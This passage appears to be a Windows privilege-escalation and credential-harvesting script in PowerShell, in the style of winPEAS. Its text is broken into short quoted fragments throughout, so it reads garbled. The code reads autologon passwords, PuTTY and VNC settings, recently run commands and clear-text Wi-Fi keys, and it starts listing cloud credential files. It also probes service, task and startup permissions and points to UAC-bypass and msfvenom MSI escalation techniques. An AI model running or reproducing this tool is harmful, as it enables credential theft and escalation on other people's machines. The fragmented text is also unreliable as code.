(Get-Item','Property "HKLM:\S','OFTWARE\Microsoft','\Windows NT\Curre','ntVersion\Winlogo','n").AltDefaultUse','rName
(Get-ItemPr','operty "HKLM:\SOF','TWARE\Microsoft\W','indows NT\Current','Version\Winlogon"',').AltDefaultPassw','ord


Write-Host ','""
if ($TimeStamp',') { TimeElapsed }','
Write-Host -Fore','groundColor Blue ','"=========|| RDCM','an Settings Check','"

if (Test-Path ','"$env:USERPROFILE','\appdata\Local\Mi','crosoft\Remote De','sktop Connection ','Manager\RDCMan.se','ttings") {
  Writ','e-Host "RDCMan Se','ttings Found at: ','$($env:USERPROFIL','E)\appdata\Local\','Microsoft\Remote ','Desktop Connectio','n Manager\RDCMan.','settings" -Foregr','oundColor Red
}
e','lse { Write-Host ','"No RDCMan.Settin','gs found." }


Wr','ite-Host ""
if ($','TimeStamp) { Time','Elapsed }
Write-H','ost -ForegroundCo','lor Blue "=======','==|| RDP Saved Co','nnections Check"
','
Write-Host "HK_U','sers"
New-PSDrive',' -PSProvider Regi','stry -Name HKU -R','oot HKEY_USERS -E','rrorAction Silent','lyContinue
Get-Ch','ildItem HKU:\ -Er','rorAction Silentl','yContinue | ForEa','ch-Object {
  # g','et the SID from o','utput
  $HKUSID =',' $_.Name.Replace(','''HKEY_USERS\'', ""',')
  if (Test-Path',' "registry::HKEY_','USERS\$HKUSID\Sof','tware\Microsoft\T','erminal Server Cl','ient\Default") {
','    Write-Host "S','erver Found: $((G','et-ItemProperty "','registry::HKEY_US','ERS\$HKUSID\Softw','are\Microsoft\Ter','minal Server Clie','nt\Default" -Name',' MRU0).MRU0)"
  }','
  else { Write-H','ost "Not found fo','r $($_.Name)" }
}','

Write-Host "HKC','U"
if (Test-Path ','"registry::HKEY_C','URRENT_USER\Softw','are\Microsoft\Ter','minal Server Clie','nt\Default") {
  ','Write-Host "Serve','r Found: $((Get-I','temProperty "regi','stry::HKEY_CURREN','T_USER\Software\M','icrosoft\Terminal',' Server Client\De','fault" -Name MRU0',').MRU0)"
}
else {',' Write-Host "Term','inal Server Clien','t not found in HC','KU" }

Write-Host',' ""
if ($TimeStam','p) { TimeElapsed ','}
Write-Host -For','egroundColor Blue',' "=========|| Put','ty Stored Credent','ials Check"

if (','Test-Path HKCU:\S','OFTWARE\SimonTath','am\PuTTY\Sessions',') {
  Get-ChildIt','em HKCU:\SOFTWARE','\SimonTatham\PuTT','Y\Sessions | ForE','ach-Object {
    ','$RegKeyName = Spl','it-Path $_.Name -','Leaf
    Write-Ho','st "Key: $RegKeyN','ame"
    @("HostN','ame", "PortNumber','", "UserName", "P','ublicKeyFile", "P','ortForwardings", ','"ConnectionSharin','g", "ProxyUsernam','e", "ProxyPasswor','d") | ForEach-Obj','ect {
      Write','-Host "$_ :"
    ','  Write-Host "$((','Get-ItemProperty ',' HKCU:\SOFTWARE\S','imonTatham\PuTTY\','Sessions\$RegKeyN','ame).$_)"
    }
 ',' }
}
else { Write','-Host "No putty c','redentials found ','in HKCU:\SOFTWARE','\SimonTatham\PuTT','Y\Sessions" }


W','rite-Host ""
if (','$TimeStamp) { Tim','eElapsed }
Write-','Host -ForegroundC','olor Blue "======','===|| SSH Key Che','cks"
Write-Host "','"
if ($TimeStamp)',' { TimeElapsed }
','Write-Host -Foreg','roundColor Blue "','=========|| If fo','und:"
Write-Host ','"https://blog.rop','nop.com/extractin','g-ssh-private-key','s-from-windows-10','-ssh-agent/" -For','egroundColor Yell','ow
Write-Host ""
','if ($TimeStamp) {',' TimeElapsed }
Wr','ite-Host -Foregro','undColor Blue "==','=======|| Checkin','g Putty SSH KNOWN',' HOSTS"
if (Test-','Path HKCU:\Softwa','re\SimonTatham\Pu','TTY\SshHostKeys) ','{ 
  Write-Host "','$((Get-Item -Path',' HKCU:\Software\S','imonTatham\PuTTY\','SshHostKeys).Prop','erty)"
}
else { W','rite-Host "No put','ty ssh keys found','" }


Write-Host ','""
if ($TimeStamp',') { TimeElapsed }','
Write-Host -Fore','groundColor Blue ','"=========|| Chec','king for OpenSSH ','Keys"
if (Test-Pa','th HKCU:\Software','\OpenSSH\Agent\Ke','ys) { Write-Host ','"OpenSSH keys fou','nd. Try this for ','decryption: https','://github.com/rop','nop/windows_sshag','ent_extract" -For','egroundColor Yell','ow }
else { Write','-Host "No OpenSSH',' Keys found." }

','
Write-Host ""
if',' ($TimeStamp) { T','imeElapsed }
Writ','e-Host -Foregroun','dColor Blue "====','=====|| Checking ','for WinVNC Passwo','rds"
if (Test-Pat','h "HKCU:\Software','\ORL\WinVNC3\Pass','word") { Write-Ho','st " WinVNC found',' at HKCU:\Softwar','e\ORL\WinVNC3\Pas','sword" }else { Wr','ite-Host "No WinV','NC found." }


Wr','ite-Host ""
if ($','TimeStamp) { Time','Elapsed }
Write-H','ost -ForegroundCo','lor Blue "=======','==|| Checking for',' SNMP Passwords"
','if (Test-Path "HK','LM:\SYSTEM\Curren','tControlSet\Servi','ces\SNMP") { Writ','e-Host "SNMP Key ','found at HKLM:\SY','STEM\CurrentContr','olSet\Services\SN','MP" }else { Write','-Host "No SNMP fo','und." }


Write-H','ost ""
if ($TimeS','tamp) { TimeElaps','ed }
Write-Host -','ForegroundColor B','lue "=========|| ','Checking for Tigh','tVNC Passwords"
i','f (Test-Path "HKC','U:\Software\Tight','VNC\Server") { Wr','ite-Host "TightVN','C key found at HK','CU:\Software\Tigh','tVNC\Server" }els','e { Write-Host "N','o TightVNC found.','" }


Write-Host ','""
if ($TimeStamp',') { TimeElapsed }','
Write-Host -Fore','groundColor Blue ','"=========|| UAC ','Settings"
if ((Ge','t-ItemProperty HK','LM:\SOFTWARE\Micr','osoft\Windows\Cur','rentVersion\Polic','ies\System).Enabl','eLUA -eq 1) {
  W','rite-Host "Enable','LUA is equal to 1','. Part or all of ','the UAC component','s are on."
  Writ','e-Host "https://b','ook.hacktricks.wi','ki/en/windows-har','dening/authentica','tion-credentials-','uac-and-efs/uac-u','ser-account-contr','ol.html#very-basi','c-uac-bypass-full','-file-system-acce','ss" -ForegroundCo','lor Yellow
}
else',' { Write-Host "En','ableLUA value not',' equal to 1" }


','Write-Host ""
if ','($TimeStamp) { Ti','meElapsed }
Write','-Host -Foreground','Color Blue "=====','====|| Recently R','un Commands (WIN+','R)"

Get-ChildIte','m HKU:\ -ErrorAct','ion SilentlyConti','nue | ForEach-Obj','ect {
  # get the',' SID from output
','  $HKUSID = $_.Na','me.Replace(''HKEY_','USERS\'', "")
  $p','roperty = (Get-It','em "HKU:\$_\SOFTW','ARE\Microsoft\Win','dows\CurrentVersi','on\Explorer\RunMR','U" -ErrorAction S','ilentlyContinue).','Property
  $HKUSI','D | ForEach-Objec','t {
    if (Test-','Path "HKU:\$_\SOF','TWARE\Microsoft\W','indows\CurrentVer','sion\Explorer\Run','MRU") {
      Wri','te-Host -Foregrou','ndColor Blue "===','======||HKU Recen','tly Run Commands"','
      foreach ($','p in $property) {','
        Write-Ho','st "$((Get-Item "','HKU:\$_\SOFTWARE\','Microsoft\Windows','\CurrentVersion\E','xplorer\RunMRU" -','ErrorAction Silen','tlyContinue).getV','alue($p))" 
     ',' }
    }
  }
}


','Write-Host ""
if ','($TimeStamp) { Ti','meElapsed }
Write','-Host -Foreground','Color Blue "=====','====||HKCU Recent','ly Run Commands"
','$property = (Get-','Item "HKCU:\SOFTW','ARE\Microsoft\Win','dows\CurrentVersi','on\Explorer\RunMR','U" -ErrorAction S','ilentlyContinue).','Property
foreach ','($p in $property)',' {
  Write-Host "','$((Get-Item "HKCU',':\SOFTWARE\Micros','oft\Windows\Curre','ntVersion\Explore','r\RunMRU" -ErrorA','ction SilentlyCon','tinue).getValue($','p))"
}


Write-Ho','st ""
if ($TimeSt','amp) { TimeElapse','d }
Write-Host -F','oregroundColor Bl','ue "=========|| A','lways Install Ele','vated Check"
 
 
','Write-Host "Check','ing Windows Insta','ller Registry (wi','ll populate if th','e key exists)"
if',' ((Get-ItemProper','ty HKLM:\SOFTWARE','\Policies\Microso','ft\Windows\Instal','ler -ErrorAction ','SilentlyContinue)','.AlwaysInstallEle','vated -eq 1) {
  ','Write-Host "HKLM:','\SOFTWARE\Policie','s\Microsoft\Windo','ws\Installer).Alw','aysInstallElevate','d = 1" -Foregroun','dColor red
  Writ','e-Host "Try msfve','nom msi package t','o escalate" -Fore','groundColor red
 ',' Write-Host "http','s://book.hacktric','ks.wiki/en/window','s-hardening/windo','ws-local-privileg','e-escalation/inde','x.html#metasploit','-payloads" -Foreg','roundColor Yellow','
}
 
if ((Get-Ite','mProperty HKCU:\S','OFTWARE\Policies\','Microsoft\Windows','\Installer -Error','Action SilentlyCo','ntinue).AlwaysIns','tallElevated -eq ','1) { 
  Write-Hos','t "HKCU:\SOFTWARE','\Policies\Microso','ft\Windows\Instal','ler).AlwaysInstal','lElevated = 1" -F','oregroundColor re','d
  Write-Host "T','ry msfvenom msi p','ackage to escalat','e" -ForegroundCol','or red
  Write-Ho','st "https://book.','hacktricks.wiki/e','n/windows-hardeni','ng/windows-local-','privilege-escalat','ion/index.html#me','tasploit-payloads','" -ForegroundColo','r Yellow
}


Writ','e-Host ""
if ($Ti','meStamp) { TimeEl','apsed }
Write-Hos','t -ForegroundColo','r Blue "=========','|| PowerShell Inf','o"

(Get-ItemProp','erty registry::HK','EY_LOCAL_MACHINE\','SOFTWARE\Microsof','t\PowerShell\1\Po','werShellEngine).P','owerShellVersion ','| ForEach-Object ','{
  Write-Host "P','owerShell $_ avai','lable"
}
(Get-Ite','mProperty registr','y::HKEY_LOCAL_MAC','HINE\SOFTWARE\Mic','rosoft\PowerShell','\3\PowerShellEngi','ne).PowerShellVer','sion | ForEach-Ob','ject {
  Write-Ho','st  "PowerShell $','_ available"
}


','Write-Host ""
if ','($TimeStamp) { Ti','meElapsed }
Write','-Host -Foreground','Color Blue "=====','====|| PowerShell',' Registry Transcr','ipt Check"

if (T','est-Path HKCU:\So','ftware\Policies\M','icrosoft\Windows\','PowerShell\Transc','ription) {
  Get-','Item HKCU:\Softwa','re\Policies\Micro','soft\Windows\Powe','rShell\Transcript','ion
}
if (Test-Pa','th HKLM:\Software','\Policies\Microso','ft\Windows\PowerS','hell\Transcriptio','n) {
  Get-Item H','KLM:\Software\Pol','icies\Microsoft\W','indows\PowerShell','\Transcription
}
','if (Test-Path HKC','U:\Wow6432Node\So','ftware\Policies\M','icrosoft\Windows\','PowerShell\Transc','ription) {
  Get-','Item HKCU:\Wow643','2Node\Software\Po','licies\Microsoft\','Windows\PowerShel','l\Transcription
}','
if (Test-Path HK','LM:\Wow6432Node\S','oftware\Policies\','Microsoft\Windows','\PowerShell\Trans','cription) {
  Get','-Item HKLM:\Wow64','32Node\Software\P','olicies\Microsoft','\Windows\PowerShe','ll\Transcription
','}
 

Write-Host "','"
if ($TimeStamp)',' { TimeElapsed }
','Write-Host -Foreg','roundColor Blue "','=========|| Power','Shell Module Log ','Check"
if (Test-P','ath HKCU:\Softwar','e\Policies\Micros','oft\Windows\Power','Shell\ModuleLoggi','ng) {
  Get-Item ','HKCU:\Software\Po','licies\Microsoft\','Windows\PowerShel','l\ModuleLogging
}','
if (Test-Path HK','LM:\Software\Poli','cies\Microsoft\Wi','ndows\PowerShell\','ModuleLogging) {
','  Get-Item HKLM:\','Software\Policies','\Microsoft\Window','s\PowerShell\Modu','leLogging
}
if (T','est-Path HKCU:\Wo','w6432Node\Softwar','e\Policies\Micros','oft\Windows\Power','Shell\ModuleLoggi','ng) {
  Get-Item ','HKCU:\Wow6432Node','\Software\Policie','s\Microsoft\Windo','ws\PowerShell\Mod','uleLogging
}
if (','Test-Path HKLM:\W','ow6432Node\Softwa','re\Policies\Micro','soft\Windows\Powe','rShell\ModuleLogg','ing) {
  Get-Item',' HKLM:\Wow6432Nod','e\Software\Polici','es\Microsoft\Wind','ows\PowerShell\Mo','duleLogging
}
 

','Write-Host ""
if ','($TimeStamp) { Ti','meElapsed }
Write','-Host -Foreground','Color Blue "=====','====|| PowerShell',' Script Block Log',' Check"
 
if ( Te','st-Path HKCU:\Sof','tware\Policies\Mi','crosoft\Windows\P','owerShell\ScriptB','lockLogging) {
  ','Get-Item HKCU:\So','ftware\Policies\M','icrosoft\Windows\','PowerShell\Script','BlockLogging
}
if',' ( Test-Path HKLM',':\Software\Polici','es\Microsoft\Wind','ows\PowerShell\Sc','riptBlockLogging)',' {
  Get-Item HKL','M:\Software\Polic','ies\Microsoft\Win','dows\PowerShell\S','criptBlockLogging','
}
if ( Test-Path',' HKCU:\Wow6432Nod','e\Software\Polici','es\Microsoft\Wind','ows\PowerShell\Sc','riptBlockLogging)',' {
  Get-Item HKC','U:\Wow6432Node\So','ftware\Policies\M','icrosoft\Windows\','PowerShell\Script','BlockLogging
}
if',' ( Test-Path HKLM',':\Wow6432Node\Sof','tware\Policies\Mi','crosoft\Windows\P','owerShell\ScriptB','lockLogging) {
  ','Get-Item HKLM:\Wo','w6432Node\Softwar','e\Policies\Micros','oft\Windows\Power','Shell\ScriptBlock','Logging
}


Write','-Host ""
if ($Tim','eStamp) { TimeEla','psed }
Write-Host',' -ForegroundColor',' Blue "=========|','| WSUS check for ','http and UseWASer','ver = 1, if true,',' might be vulnera','ble to exploit"
W','rite-Host "https:','//book.hacktricks','.wiki/en/windows-','hardening/windows','-local-privilege-','escalation/index.','html#wsus" -Foreg','roundColor Yellow','
if (Test-Path HK','LM:\SOFTWARE\Poli','cies\Microsoft\Wi','ndows\WindowsUpda','te) {
  Get-Item ','HKLM:\SOFTWARE\Po','licies\Microsoft\','Windows\WindowsUp','date
}
if ((Get-I','temProperty HKLM:','\SOFTWARE\Policie','s\Microsoft\Windo','ws\WindowsUpdate\','AU -Name "USEWUSe','rver" -ErrorActio','n SilentlyContinu','e).UseWUServer) {','
  (Get-ItemPrope','rty HKLM:\SOFTWAR','E\Policies\Micros','oft\Windows\Windo','wsUpdate\AU -Name',' "USEWUServer").U','seWUServer
}


Wr','ite-Host ""
if ($','TimeStamp) { Time','Elapsed }
Write-H','ost -ForegroundCo','lor Blue "=======','==|| Internet Set','tings HKCU / HKLM','"

$property = (G','et-Item "HKCU:\So','ftware\Microsoft\','Windows\CurrentVe','rsion\Internet Se','ttings" -ErrorAct','ion SilentlyConti','nue).Property
for','each ($p in $prop','erty) {
  Write-H','ost "$p - $((Get-','Item "HKCU:\Softw','are\Microsoft\Win','dows\CurrentVersi','on\Internet Setti','ngs" -ErrorAction',' SilentlyContinue',').getValue($p))"
','}
 
$property = (','Get-Item "HKLM:\S','oftware\Microsoft','\Windows\CurrentV','ersion\Internet S','ettings" -ErrorAc','tion SilentlyCont','inue).Property
fo','reach ($p in $pro','perty) {
  Write-','Host "$p - $((Get','-Item "HKLM:\Soft','ware\Microsoft\Wi','ndows\CurrentVers','ion\Internet Sett','ings" -ErrorActio','n SilentlyContinu','e).getValue($p))"','
}


############','############ PROC','ESS INFORMATION #','#################','######
Write-Host',' ""
if ($TimeStam','p) { TimeElapsed ','}
Write-Host -For','egroundColor Blue',' "=========|| RUN','NING PROCESSES"

','
Write-Host ""
if',' ($TimeStamp) { T','imeElapsed }
Writ','e-Host -Foregroun','dColor Blue "====','=====|| Checking ','user permissions ','on running proces','ses"
Get-Process ','| Select-Object P','ath -Unique | For','Each-Object { Sta','rt-ACLCheck -Targ','et $_.path }


#T','ODO, vulnerable s','ystem process run','ning that we have',' access to. 
Writ','e-Host ""
if ($Ti','meStamp) { TimeEl','apsed }
Write-Hos','t -ForegroundColo','r Blue "=========','|| System process','es"
Start-Process',' tasklist -Argume','ntList ''/v /fi "u','sername eq system','"'' -Wait -NoNewWi','ndow


##########','############## SE','RVICES ##########','##############
Wr','ite-Host ""
if ($','TimeStamp) { Time','Elapsed }
Write-H','ost -ForegroundCo','lor Blue "=======','==|| SERVICE path',' vulnerable check','"
Write-Host "Che','cking for vulnera','ble service .exe"','
# Gathers all se','rvices running an','d stopped, based ','on .exe and shows',' the AccessContro','lList
$UniqueServ','ices = @{}
Get-Wm','iObject Win32_Ser','vice | Where-Obje','ct { $_.PathName ','-like ''*.exe*'' } ','| ForEach-Object ','{
  $Path = ($_.P','athName -split ''(','?<=\.exe\b)'')[0].','Trim(''"'')
  $Uniq','ueServices[$Path]',' = $_.Name
}
fore','ach ( $h in ($Uni','queServices | Sel','ect-Object -Uniqu','e).GetEnumerator(',')) {
  Start-ACLC','heck -Target $h.N','ame -ServiceName ','$h.Value
}


####','#################','### UNQUOTED SERV','ICE PATH CHECK ##','##########
Write-','Host ""
if ($Time','Stamp) { TimeElap','sed }
Write-Host ','-ForegroundColor ','Blue "=========||',' Checking for Unq','uoted Service Pat','hs"
# All credit ','to Ivan-Sincek
# ','https://github.co','m/ivan-sincek/unq','uoted-service-pat','hs/blob/master/sr','c/unquoted_servic','e_paths_mini.ps1
','
UnquotedServiceP','athCheck


######','#################','# REGISTRY SERVIC','E CONFIGURATION C','HECK ###
Write-Ho','st ""
if ($TimeSt','amp) { TimeElapse','d }
Write-Host -F','oregroundColor Bl','ue "=========|| C','hecking Service R','egistry Permissio','ns"
Write-Host "T','his will take som','e time."

Get-Chi','ldItem ''HKLM:\Sys','tem\CurrentContro','lSet\services\'' |',' ForEach-Object {','
  $target = $_.N','ame.Replace("HKEY','_LOCAL_MACHINE", ','"hklm:")
  Start-','aclcheck -Target ','$target
}


#####','#################','## SCHEDULED TASK','S ###############','#########
Write-H','ost ""
if ($TimeS','tamp) { TimeElaps','ed }
Write-Host -','ForegroundColor B','lue "=========|| ','SCHEDULED TASKS v','ulnerable check"
','#Scheduled tasks ','audit 


Write-Ho','st ""
if ($TimeSt','amp) { TimeElapse','d }
Write-Host -F','oregroundColor Bl','ue "=========|| T','esting access to ','c:\windows\system','32\tasks"
if (Get','-ChildItem "c:\wi','ndows\system32\ta','sks" -ErrorAction',' SilentlyContinue',') {
  Write-Host ','"Access confirmed',', may need futher',' investigation"
 ',' Get-ChildItem "c',':\windows\system3','2\tasks"
}
else {','
  Write-Host "No',' admin access to ','scheduled tasks f','older."
  Get-Sch','eduledTask | Wher','e-Object { $_.Tas','kPath -notlike "\','Microsoft*" } | F','orEach-Object {
 ','   $Actions = $_.','Actions.Execute
 ','   if ($Actions -','ne $null) {
     ',' foreach ($a in $','actions) {
      ','  if ($a -like "%','windir%*") { $a =',' $a.replace("%win','dir%", $Env:windi','r) }
        else','if ($a -like "%Sy','stemRoot%*") { $a',' = $a.replace("%S','ystemRoot%", $Env',':windir) }
      ','  elseif ($a -lik','e "%localappdata%','*") { $a = $a.rep','lace("%localappda','ta%", "$env:UserP','rofile\appdata\lo','cal") }
        e','lseif ($a -like "','%appdata%*") { $a',' = $a.replace("%l','ocalappdata%", $e','nv:Appdata) }
   ','     $a = $a.Repl','ace(''"'', '''')
    ','    Start-ACLChec','k -Target $a
    ','    Write-Host "`','n"
        Write-','Host "TaskName: $','($_.TaskName)"
  ','      Write-Host ','"-------------"
 ','       New-Object',' -TypeName PSObje','ct -Property ([Or','dered]@{
        ','  LastResult = $(','($_ | Get-Schedul','edTaskInfo).LastT','askResult)
      ','    NextRun    = ','$(($_ | Get-Sched','uledTaskInfo).Nex','tRunTime)
       ','   Status     = $','_.State
         ',' Command    = $_.','Actions.execute
 ','         Argument','s  = $_.Actions.A','rguments 
       ',' }) | Write-Host
','      } 
    }
  ','}
}


###########','############# STA','RTUP APPLIICATION','S ###############','##########
Write-','Host ""
if ($Time','Stamp) { TimeElap','sed }
Write-Host ','-ForegroundColor ','Blue "=========||',' STARTUP APPLICAT','IONS Vulnerable C','heck"
"Check if y','ou can modify any',' binary that is g','oing to be execut','ed by admin or if',' you can imperson','ate a not found b','inary"
Write-Host',' "https://book.ha','cktricks.wiki/en/','windows-hardening','/windows-local-pr','ivilege-escalatio','n/index.html#run-','at-startup" -Fore','groundColor Yello','w

@("C:\Document','s and Settings\Al','l Users\Start Men','u\Programs\Startu','p",
  "C:\Documen','ts and Settings\$','env:Username\Star','t Menu\Programs\S','tartup", 
  "$env',':ProgramData\Micr','osoft\Windows\Sta','rt Menu\Programs\','Startup", 
  "$en','v:Appdata\Microso','ft\Windows\Start ','Menu\Programs\Sta','rtup") | ForEach-','Object {
  if (Te','st-Path $_) {
   ',' # CheckACL of ea','ch top folder the','n each sub folder','/file
    Start-A','CLCheck $_
    Ge','t-ChildItem -Recu','rse -Force -Path ','$_ | ForEach-Obje','ct {
      $SubIt','em = $_.FullName
','      if (Test-Pa','th $SubItem) { 
 ','       Start-ACLC','heck -Target $Sub','Item
      }
    ','}
  }
}


Write-H','ost ""
if ($TimeS','tamp) { TimeElaps','ed }
Write-Host -','ForegroundColor B','lue "=========|| ','STARTUP APPS Regi','stry Check"

@("r','egistry::HKLM\Sof','tware\Microsoft\W','indows\CurrentVer','sion\Run",
  "reg','istry::HKLM\Softw','are\Microsoft\Win','dows\CurrentVersi','on\RunOnce",
  "r','egistry::HKCU\Sof','tware\Microsoft\W','indows\CurrentVer','sion\Run",
  "reg','istry::HKCU\Softw','are\Microsoft\Win','dows\CurrentVersi','on\RunOnce") | Fo','rEach-Object {
  ','# CheckACL of eac','h Property Value ','found
  $ROPath =',' $_
  (Get-Item $','_) | ForEach-Obje','ct {
    $ROPrope','rty = $_.property','
    $ROProperty ','| ForEach-Object ','{
      Start-ACL','Check ((Get-ItemP','roperty -Path $RO','Path).$_ -split ''','(?<=\.exe\b)'')[0]','.Trim(''"'')
    }
','  }
}

#schtasks ','/query /fo TABLE ','/nh | findstr /v ','/i "disable desha','b informa"


####','#################','### INSTALLED APP','LICATIONS #######','#################','
Write-Host ""
if',' ($TimeStamp) { T','imeElapsed }
Writ','e-Host -Foregroun','dColor Blue "====','=====|| INSTALLED',' APPLICATIONS"
Wr','ite-Host "Generat','ing list of insta','lled applications','"

#Get applicati','ons via Regsitry
','Get-InstalledAppl','ications

Write-H','ost ""
if ($TimeS','tamp) { TimeElaps','ed }
Write-Host -','ForegroundColor B','lue "=========|| ','LOOKING FOR BASH.','EXE"
Get-ChildIte','m C:\Windows\WinS','xS\ -Filter "amd6','4_microsoft-windo','ws-lxss-bash*" | ','ForEach-Object {
','  Write-Host $((G','et-ChildItem $_.F','ullName -Recurse ','-Filter "*bash.ex','e*").FullName)
}
','@("bash.exe", "ws','l.exe") | ForEach','-Object { Write-H','ost $((Get-ChildI','tem C:\Windows\Sy','stem32\ -Filter $','_).FullName) }


','Write-Host ""
if ','($TimeStamp) { Ti','meElapsed }
Write','-Host -Foreground','Color Blue "=====','====|| LOOKING FO','R SCCM CLIENT"
$r','esult = Get-WmiOb','ject -Namespace "','root\ccm\clientSD','K" -Class CCM_App','lication -Propert','y * -ErrorAction ','SilentlyContinue ','| Select-Object N','ame, SoftwareVers','ion
if ($result) ','{ $result }
elsei','f (Test-Path ''C:\','Windows\CCM\SCCli','ent.exe'') { Write','-Host "SCCM Clien','t found at C:\Win','dows\CCM\SCClient','.exe" -Foreground','Color Cyan }
else',' { Write-Host "No','t Installed." }

','
################','######## NETWORK ','INFORMATION #####','#################','##
Write-Host ""
','if ($TimeStamp) {',' TimeElapsed }
Wr','ite-Host -Foregro','undColor Blue "==','=======|| NETWORK',' INFORMATION"

Wr','ite-Host ""
if ($','TimeStamp) { Time','Elapsed }
Write-H','ost -ForegroundCo','lor Blue "=======','==|| HOSTS FILE"
','
Write-Host "Get ','content of etc\ho','sts file"
Get-Con','tent "c:\windows\','system32\drivers\','etc\hosts"

Write','-Host ""
if ($Tim','eStamp) { TimeEla','psed }
Write-Host',' -ForegroundColor',' Blue "=========|','| IP INFORMATION"','

# Get all v4 an','d v6 addresses
Wr','ite-Host ""
if ($','TimeStamp) { Time','Elapsed }
Write-H','ost -ForegroundCo','lor Blue "=======','==|| Ipconfig ALL','"
Start-Process i','pconfig.exe -Argu','mentList "/all" -','Wait -NoNewWindow','


Write-Host ""
','if ($TimeStamp) {',' TimeElapsed }
Wr','ite-Host -Foregro','undColor Blue "==','=======|| DNS Cac','he"
ipconfig /dis','playdns | Select-','String "Record" |',' ForEach-Object {',' Write-Host $(''{0','}'' -f $_) }
 
Wri','te-Host ""
if ($T','imeStamp) { TimeE','lapsed }
Write-Ho','st -ForegroundCol','or Blue "========','=|| LISTENING POR','TS"

# running ne','tstat as powershe','ll is too slow to',' print to console','
Start-Process NE','TSTAT.EXE -Argume','ntList "-ano" -Wa','it -NoNewWindow

','
Write-Host ""
if',' ($TimeStamp) { T','imeElapsed }
Writ','e-Host -Foregroun','dColor Blue "====','=====|| ARP Table','"

# Arp table in','fo
Start-Process ','arp -ArgumentList',' "-A" -Wait -NoNe','wWindow

Write-Ho','st ""
if ($TimeSt','amp) { TimeElapse','d }
Write-Host -F','oregroundColor Bl','ue "=========|| R','outes"

# Route i','nfo
Start-Process',' route -ArgumentL','ist "print" -Wait',' -NoNewWindow

Wr','ite-Host ""
if ($','TimeStamp) { Time','Elapsed }
Write-H','ost -ForegroundCo','lor Blue "=======','==|| Network Adap','ter info"

# Netw','ork Adapter info
','Get-NetAdapter | ','ForEach-Object { ','
  Write-Host "--','--------"
  Write','-Host $_.Name
  W','rite-Host $_.Inte','rfaceDescription
','  Write-Host $_.i','fIndex
  Write-Ho','st $_.Status
  Wr','ite-Host $_.MacAd','dress
  Write-Hos','t "----------"
} ','


Write-Host ""
','if ($TimeStamp) {',' TimeElapsed }
Wr','ite-Host -Foregro','undColor Blue "==','=======|| Checkin','g for WiFi passwo','rds"
# Select all',' wifi adapters, t','hen pull the SSID',' along with the p','assword

((netsh.','exe wlan show pro','files) -match ''\s','{2,}:\s'').replace','("    All User Pr','ofile     : ", ""',') | ForEach-Objec','t {
  netsh wlan ','show profile name','="$_" key=clear 
','}


Write-Host ""','
if ($TimeStamp) ','{ TimeElapsed }
W','rite-Host -Foregr','oundColor Blue "=','========|| Enable','d firewall rules ','- displaying comm','and only - it can',' overwrite the di','splay buffer"
Wri','te-Host -Foregrou','ndColor Blue "===','======|| show all',' rules with: nets','h advfirewall fir','ewall show rule d','ir=in name=all"
#',' Route info

Writ','e-Host ""
if ($Ti','meStamp) { TimeEl','apsed }
Write-Hos','t -ForegroundColo','r Blue "=========','|| SMB SHARES"
Wr','ite-Host "Will en','umerate SMB Share','s and Access if a','ny are available"',' 

Get-SmbShare |',' Get-SmbShareAcce','ss | ForEach-Obje','ct {
  $SMBShareO','bject = $_
# see ','line 70 for expla','nation of what th','is does
  whoami.','exe /groups /fo c','sv | select-objec','t -skip 2 | Conve','rtFrom-Csv -Heade','r ''group name'' | ','Select-Object -Ex','pandProperty ''gro','up name'' | ForEac','h-Object {
    if',' ($SMBShareObject','.AccountName -lik','e $_ -and ($SMBSh','areObject.AccessR','ight -like "Full"',' -or "Change") -a','nd $SMBShareObjec','t.AccessControlTy','pe -like "Allow" ',') {
      Write-H','ost -ForegroundCo','lor red "$($SMBSh','areObject.Account','Name) has $($SMBS','hareObject.Access','Right) to $($SMBS','hareObject.Name)"','
    }
  }
}


##','#################','##### USER INFO #','#################','######
Write-Host',' ""
if ($TimeStam','p) { TimeElapsed ','}
Write-Host -For','egroundColor Blue',' "=========|| USE','R INFO"
Write-Hos','t "== || Generati','ng List of all Lo','cal Administrator','s, Users and Back','up Operators (if ','any exist)"

# Co','de has been modif','ied to accomodate',' for any language',' by filtering onl','y on the output a','nd not looking fo','r a string of tex','t
# Foreach loop ','to get all local ','groups, then exam','ine each group''s ','members.
Get-Loca','lGroup | ForEach-','Object {
  "`n Gr','oup: $($_.Name) `','n"
  if(Get-Local','GroupMember -name',' $_.Name){
    (G','et-LocalGroupMemb','er -name $_.Name)','.Name
  }
  else{','
    "     {GROUP',' EMPTY}"
  }
}


','Write-Host ""
if ','($TimeStamp) { Ti','meElapsed }
Write','-Host -Foreground','Color Blue "=====','====|| USER DIREC','TORY ACCESS CHECK','"
Get-ChildItem C',':\Users\* | ForEa','ch-Object {
  if ','(Get-ChildItem $_','.FullName -ErrorA','ction SilentlyCon','tinue) {
    Writ','e-Host -Foregroun','dColor red "Read ','Access to $($_.Fu','llName)"
  }
}

#','Whoami 
Write-Hos','t ""
if ($TimeSta','mp) { TimeElapsed',' }
Write-Host -Fo','regroundColor Blu','e "=========|| WH','OAMI INFO"
Write-','Host ""
if ($Time','Stamp) { TimeElap','sed }
Write-Host ','-ForegroundColor ','Blue "=========||',' Check Token acce','ss here: https://','book.hacktricks.w','iki/en/windows-ha','rdening/windows-l','ocal-privilege-es','calation/privileg','e-escalation-abus','ing-tokens.html#a','busing-tokens" -F','oregroundColor ye','llow
Write-Host -','ForegroundColor B','lue "=========|| ','Check if you are ','inside the Admini','strators group or',' if you have enab','led any token tha','t can be use to e','scalate privilege','s like SeImperson','atePrivilege, SeA','ssignPrimaryPrivi','lege, SeTcbPrivil','ege, SeBackupPriv','ilege, SeRestoreP','rivilege, SeCreat','eTokenPrivilege, ','SeLoadDriverPrivi','lege, SeTakeOwner','shipPrivilege, Se','DebbugPrivilege"
','Write-Host "https','://book.hacktrick','s.wiki/en/windows','-hardening/window','s-local-privilege','-escalation/index','.html#users--grou','ps" -ForegroundCo','lor Yellow
Start-','Process whoami.ex','e -ArgumentList "','/all" -Wait -NoNe','wWindow


Write-H','ost ""
if ($TimeS','tamp) { TimeElaps','ed }
Write-Host -','ForegroundColor B','lue "=========|| ','Cloud Credentials',' Check"
$Users = ','(Get-ChildItem C:','\Users).Name
$CCr','eds = @(".aws\cre','dentials",
  "App','Data\Roaming\gclo','ud\credentials.db','",
  "AppData\Roa','ming\gcloud\legac','y_credentials",
 ',' "AppData\Roaming','\gcloud\access_to','kens.db",
  ".azu','re\accessTokens.j','son",
  ".azure\a','zureProfile.json"',') 
foreach ($u in',' $users) {
  $CCr','eds | ForEach-Obj','ect {
